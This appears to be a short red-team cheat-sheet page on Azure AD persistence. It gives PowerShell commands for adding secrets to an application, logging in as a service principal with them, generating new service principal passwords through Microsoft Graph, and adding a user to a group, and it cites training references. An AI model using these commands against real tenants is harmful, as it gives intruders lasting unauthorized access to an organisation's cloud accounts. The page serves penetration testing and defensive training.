# Azure AD - Persistence

## Add Secrets to Application

* Add secrets with [lutzenfried/OffensiveCloud/Add-AzADAppSecret.ps1](https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Tools/Add-AzADAppSecret.ps1)
    ```powershell
    PS > . C:\Tools\Add-AzADAppSecret.ps1
    PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose
    ```

* Use secrets to authenticate as Service Principal
    ```ps1
    PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
    PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
    PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
    ```


## Add Service Principal

* Generate a new service principal password/secret
    ```ps1
    Import-Module Microsoft.Graph.Applications
    Connect-MgGraph 
    $servicePrincipalId = "<service-principal-id>"

    $params = @{
        passwordCredential = @{
            displayName = "NewCreds"
        }
    }
    Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipalId -BodyParameter $params
    ```


## Add User to Group

```ps1
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```


## References

* [Maintaining Azure Persistence via automation accounts - Karl Fosaaen - September 12, 2019](https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/)
* [Microsoft Graph - servicePrincipal: addPassword](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=powershell)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)